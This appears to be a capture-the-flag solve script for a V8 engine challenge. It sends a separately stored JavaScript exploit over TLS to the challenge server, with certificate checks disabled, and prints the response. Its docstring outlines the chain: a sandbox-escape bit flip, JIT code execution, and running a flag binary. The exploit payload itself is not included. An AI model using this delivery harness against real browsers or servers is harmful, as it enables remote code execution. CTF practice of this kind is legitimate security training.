#!/usr/bin/env python3
"""
v8-motor solve: one-shot out-of-sandbox bit flip -> JIT code exec -> execve /rdflag.
"""
import sys, ssl, socket

HOST = sys.argv[1] if len(sys.argv) > 1 else "motor-v8-3da81032cc73e5fc.challs.ctf.thefewchosen.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
JS = sys.argv[3] if len(sys.argv) > 3 else "scratch/r/exp_real.js"

payload = open(JS, "rb").read()
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=30),
                    server_hostname=HOST)
s.sendall(b"%d\n" % len(payload))
s.sendall(payload)
s.settimeout(100)
buf = b""
try:
    while True:
        c = s.recv(4096)
        if not c:
            break
        buf += c
        sys.stdout.write(c.decode("utf-8", "replace"))
        sys.stdout.flush()
except Exception as e:
    print("\n[recv end] %r" % (e,))
s.close()
